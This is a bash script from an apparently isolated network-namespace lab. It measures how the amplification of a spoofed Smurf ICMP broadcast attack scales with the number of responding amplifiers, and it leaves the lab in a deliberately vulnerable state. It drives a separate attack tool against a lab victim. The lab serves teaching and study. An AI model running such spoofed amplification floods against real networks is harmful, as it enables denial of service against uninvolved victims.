#!/usr/bin/env bash
# scale_test.sh — show that the amplification factor scales with the number of
# live amplifiers: factor(k) ~= k.
#
#   sudo bash scale_test.sh [--count N] [--rate PPS]
#
# For k = 1 .. AMP_COUNT it enables exactly k amplifiers (the rest are told to
# ignore broadcast echo), fires the identical spoofed Smurf attack, and reads the
# victim's echo-reply counter. The result is a dose-response table + a quick ASCII
# bar chart, written to results/scaling.tsv. The lab is left fully vulnerable again
# at the end. Requires the lab to be up (run setup_lab.sh first).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lab.env
source "$SCRIPT_DIR/lab.env"

if [ "$(id -u)" -ne 0 ]; then exec sudo -E bash "$0" "$@"; fi

COUNT=100
RATE=50
while [ $# -gt 0 ]; do
  case "$1" in
    --count) COUNT="$2"; shift 2;;
    --rate)  RATE="$2";  shift 2;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

ip netns list 2>/dev/null | grep -q '^router' || {
  echo "error: lab is not up — run 'sudo bash setup_lab.sh' first." >&2; exit 1; }

victim_intype0() {
  ip netns exec victim cat /proc/net/snmp | awk '
    /^IcmpMsg:/ { if (!h) { for (i=2;i<=NF;i++) c[$i]=i; h=1 }
                  else { print (("InType0" in c) ? $(c["InType0"]) : 0); p=1 } }
    END { if (!p) print 0 }'
}
# enable_k <k>: amps 1..k answer broadcast echo; amps k+1..AMP_COUNT stay silent.
enable_k() {
  local k="$1" i v
  for i in $(seq 1 "$AMP_COUNT"); do
    [ "$i" -le "$k" ] && v=0 || v=1     # 0 = answer (live), 1 = ignore (silent)
    ip netns exec "amp$i" sysctl -qw "net.ipv4.icmp_echo_ignore_broadcasts=$v"
  done
}

OUT="$SCRIPT_DIR/$RESULTS_DIR_NAME/scaling.tsv"
mkdir -p "$(dirname "$OUT")"
printf 'amplifiers\tsent\treplies\tfactor\n' >"$OUT"

echo "[*] Amplifier-count scaling sweep: $COUNT spoofed requests per step, ${RATE}pps."
printf '  %-11s %-6s %-8s %-7s %s\n' "amplifiers" "sent" "replies" "factor" "bar"
for k in $(seq 1 "$AMP_COUNT"); do
  enable_k "$k"
  sleep 0.2
  b="$(victim_intype0)"
  ip netns exec attacker python3 "$SCRIPT_DIR/src/smurf.py" \
    --victim "$VICTIM_IP" --broadcast "$AMP_BCAST" --count "$COUNT" --rate "$RATE" \
    >/dev/null 2>&1
  sleep 1
  replies=$(( $(victim_intype0) - b ))
  factor="$(awk -v r="$replies" -v c="$COUNT" 'BEGIN{ if(c>0) printf "%.2f", r/c; else print "n/a" }')"
  bar="$(awk -v k="$k" 'BEGIN{ s=""; for(i=0;i<k;i++) s=s "#"; print s }')"
  printf '  %-11s %-6s %-8s %-7s %s\n' "$k" "$COUNT" "$replies" "$factor" "$bar"
  printf '%s\t%s\t%s\t%s\n' "$k" "$COUNT" "$replies" "$factor" >>"$OUT"
done

# Restore the fully vulnerable config (all amplifiers answering).
enable_k "$AMP_COUNT"
echo
echo "[+] factor tracks the number of live amplifiers (factor(k) ~= k)."
echo "[+] table: $OUT"
echo "    (lab restored to fully vulnerable: all $AMP_COUNT amplifiers answering)"
